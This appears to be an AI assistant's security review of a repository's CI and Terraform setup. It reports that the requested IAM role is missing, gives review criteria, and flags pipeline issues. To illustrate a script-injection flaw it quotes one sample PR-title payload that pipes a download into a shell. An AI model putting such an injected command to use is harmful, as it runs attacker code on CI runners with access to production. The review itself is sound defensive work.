I can't review the IAM role, because it isn't in this repository. I searched all the `.tf`, `.hcl`, YAML, JSON and Markdown files. There is no `aws_iam_role`, no trust policy, no attached policy, and no `assume_role` or OIDC configuration. `.gitlab-ci.yml`, the README and `docker-compose.yml` don't mention the role or Terraform.

I also couldn't read the skill's `execution-identity.md` reference, because the read was denied. So the findings below come from the files in the repo, not from that checklist.

If you give me the role's trust policy and permission policies, or the Terraform that defines it, I'll review it. Check these things:
- **Trust policy:** the principal should be narrow. For OIDC, check the `sub` and `aud` conditions, and that they don't use wildcards across repositories or branches.
- **Permissions:** no `Action: "*"` or `Resource: "*"`, and no `iam:*` or `iam:PassRole` without limits. Consider a permissions boundary.
- **Plan and apply:** a read-only role for plan on pull requests, and a separate write role for apply that only protected branches or environments can assume.
- **Credentials:** short-lived, with no long-lived access keys in CI variables.

I didn't run `terraform init` or `validate`.

**Issues in the pipeline you'd be applying through**
- **`.github/workflows/deploy.yml:7`:** `permissions: write-all` runs on `pull_request`. That gives the job's token write access to everything in the repository. Set it to `contents: read`, and add `id-token: write` only for the job that assumes the role through OIDC.
- **`.github/workflows/deploy.yml:14`:** `${{ github.event.pull_request.title }}` is interpolated straight into a shell command, which allows script injection. A PR title like `"; curl evil | sh #` would run on the runner. If that runner can assume your production role, this is a path to production. Pass the title through an `env:` variable instead.
- **`infra/main.tf:1-10`:** the `bastion` security group allows SSH (port 22) from `0.0.0.0/0`. Restrict it to known CIDRs or use SSM Session Manager.
- **Missing pieces:** there is no backend block, no provider block with version pins, and no `.terraform.lock.hcl`.

I wouldn't let this pipeline apply to production until the workflow permissions and the injection are fixed and the role has been reviewed. Do you want me to fix the workflow issues now, or can you point me to where the role is defined?
